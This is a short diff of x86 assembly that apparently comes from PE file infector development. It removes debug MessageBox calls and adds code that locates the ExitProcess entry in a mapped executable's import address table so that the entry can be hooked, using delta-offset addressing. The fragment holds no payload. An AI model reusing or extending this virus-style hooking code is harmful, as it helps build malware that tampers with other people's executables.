@@ -1,4 +1,5 @@
 ; IAT Hooking (ExitProcess)
+mov	[DELTA VAExitProcess], 0
 ; Check if valid
 cmp	[DELTA OffsetIAT], 0
 je	doNotHook
@@ -30,14 +31,6 @@ pop	edx
 cmp	eax, 0
 jne	endIterateFunc
 
-pusha
-push	0
-push	edx
-push	edx
-push	0
-call	[DELTA pMessageBox]
-popa
-
 ; Iterate on all Imported Functions
 mov	edx, edi
 mov	edx, [edx]
@@ -67,13 +60,26 @@ pop	edx
 cmp	eax, 0
 jne	nextIterateFunc
 
-pusha
-push	0
-push	ebx
-push	ebx
-push	0
-call	[DELTA pMessageBox]
-popa
+; We found it ! Get VA
+; Get Array of VA
+mov	edx, edi
+; add	edx, 010h
+mov	edx, [edx]
+mov	eax, [DELTA PeFileMap]
+add	edx, eax
+mov	eax, [DELTA OffsetIAT]
+sub	edx, eax
+; Go to index
+mov	eax, esi
+mov	ecx, 4
+push	edx
+mul	ecx
+pop	edx
+add	edx, eax
+mov	edx, [edx]
+; Store VA
+mov	[DELTA VAExitProcess], edx
+jmp	doNotHook
 
 nextIterateFunc:
 add	edx, 4
